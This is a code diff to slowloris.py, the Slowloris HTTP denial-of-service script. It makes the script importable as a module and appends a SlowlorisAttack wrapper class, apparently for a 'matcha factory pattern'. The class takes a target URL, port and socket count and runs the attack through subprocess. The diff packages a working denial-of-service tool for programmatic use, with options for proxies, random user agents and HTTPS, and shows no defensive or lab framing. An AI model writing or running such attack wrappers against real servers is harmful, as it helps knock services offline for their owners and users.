@@ -58,16 +58,17 @@ parser.set_defaults(verbose=False)
 parser.set_defaults(randuseragent=False)
 parser.set_defaults(useproxy=False)
 parser.set_defaults(https=False)
-args = parser.parse_args()
+args = parser.parse_args() if __name__ == "__main__" else parser.parse_args([])
 
-if len(sys.argv) <= 1:
-    parser.print_help()
-    sys.exit(1)
+if __name__ == "__main__":
+    if len(sys.argv) <= 1:
+        parser.print_help()
+        sys.exit(1)
 
-if not args.host:
-    print("Host required!")
-    parser.print_help()
-    sys.exit(1)
+    if not args.host:
+        print("Host required!")
+        parser.print_help()
+        sys.exit(1)
 
 if args.useproxy:
     # Tries to import to external "socks" library
@@ -111,6 +112,8 @@ if args.https:
 
     ssl.SSLSocket.send_line = send_line
     ssl.SSLSocket.send_header = send_header
+else:
+    import ssl  # noqa: F811 — needed for SlowlorisAttack.execute even if not using HTTPS
 
 list_of_sockets = []
 user_agents = [
@@ -227,3 +230,38 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
+class SlowlorisAttack:
+    """Wrapper that makes slowloris compatible with the matcha factory pattern."""
+
+    def __init__(self, target_url: str, sockets: int = 150, port: int = 80, verbose: bool = False):
+        import urllib.parse
+        parsed = urllib.parse.urlparse(target_url)
+        self.host = parsed.hostname or target_url
+        self.port = parsed.port or port
+        self.sockets = sockets
+        self.verbose = verbose
+
+    def execute(self):
+        import subprocess, os, sys
+        script = os.path.join(os.path.dirname(__file__), "slowloris.py")
+        cmd = [
+            sys.executable, script,
+            self.host,
+            "-p", str(self.port),
+            "-s", str(self.sockets),
+        ]
+        if self.verbose:
+            cmd.append("-v")
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+        if result.stdout:
+            print(result.stdout)
+        if result.stderr:
+            print(result.stderr)
+        return {
+            "target": self.host,
+            "port": self.port,
+            "sockets": self.sockets,
+            "exit_code": result.returncode,
+        }
